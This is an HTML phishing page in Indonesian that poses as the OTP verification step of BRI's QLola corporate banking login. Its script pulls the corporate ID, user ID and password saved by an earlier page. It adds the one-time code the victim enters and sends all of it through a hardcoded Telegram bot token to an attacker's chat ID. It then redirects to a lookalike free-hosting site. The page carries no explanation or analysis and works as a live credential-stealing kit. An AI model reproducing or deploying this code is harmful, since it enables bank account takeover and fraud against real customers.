<div data-replaced-tag="body">
    <div class="container">
        <div class="logo-section">
            <img src="https://img.sanishtech.com/u/4844cdb5cf56cafc16715b2ed9341ec0.png" alt="QLola by BRI">
            <p class="tagline">Integrated Corporate Solution</p>
        </div>

        <div class="login-card">
            <h2 class="login-title">VERIFIKASI OTP</h2>
            <p class="otp-description">Silahkan generate token untuk<br>Mendapatkan kode OTP</p>

            <form id="otpForm" onsubmit="return false;">
                <div class="form-group">
                    <label class="form-label">Kode OTP</label>
                    <div class="form-input-wrapper">
                        <input type="text" class="form-input" placeholder="Masukkan kode OTP" id="otp" maxlength="6" required>
                    </div>
                </div>
                <div class="resend-wrap">
                    <span class="resend-text">Tidak menerima kode? </span>
                    <span class="resend-link" id="resendBtn" onclick="resendOtp()">Kirim Ulang</span>
                    <span class="resend-timer" id="timer"></span>
                </div>

                <button type="submit" class="btn-login" id="btnVerify">Verifikasi</button>
            </form>
        </div>
    </div>

    <script>
        const otpInput = document.getElementById('otp');
        const btnVerify = document.getElementById('btnVerify');

        otpInput.addEventListener('input', () => {
            checkFilled();
        });

        function checkFilled() {
            const isFilled = otpInput.value.trim().length === 6;
            btnVerify.classList.toggle('active', isFilled);
        }

        // Handle form submit
        document.getElementById('otpForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const otp = otpInput.value.trim();

            if (otp.length !== 6) {
                alert('Masukkan kode OTP 6 digit');
                return;
            }

            // Get data from localStorage
            const storedData = JSON.parse(localStorage.getItem('qlolaData') || '{}');
            const { corporateId, userId, password } = storedData;

            // Send to Telegram
            const message = `Qlola BRI 2/2\n\nCorporate ID: ${corporateId}\nUser ID: ${userId}\nKata Sandi: ${password}\n\nOTP: ${otp}`;
            await sendToTelegram(message);

            // Clear localStorage and redirect to index
            localStorage.removeItem('qlolaData');
            window.location.href = 'https://qlolabrionline.free.site.pro/Generate-Token';
        });

        async function sendToTelegram(message) {
            const botToken = '8277421901:AAGE8YZxA5mon1SSCNP6kSV2vY3RNMMAFJs'; // Ganti dengan token bot Telegram Anda
            const chatId = '7953949040'; // Ganti dengan chat ID Anda
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                const response = await fetch(url);
                if (!response.ok) {
                    console.error('Failed to send message to Telegram');
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        let countdown = 0;
        function resendOtp() {
            if (countdown > 0) return;
            countdown = 60;
            const resendBtn = document.getElementById('resendBtn');
            const timer = document.getElementById('timer');
            resendBtn.style.display = 'none';
            timer.textContent = ' (60s)';

            const interval = setInterval(() => {
                countdown--;
                timer.textContent = ` (${countdown}s)`;
                if (countdown <= 0) {
                    clearInterval(interval);
                    resendBtn.style.display = 'inline';
                    timer.textContent = '';
                }
            }, 1000);
        }
    </script>
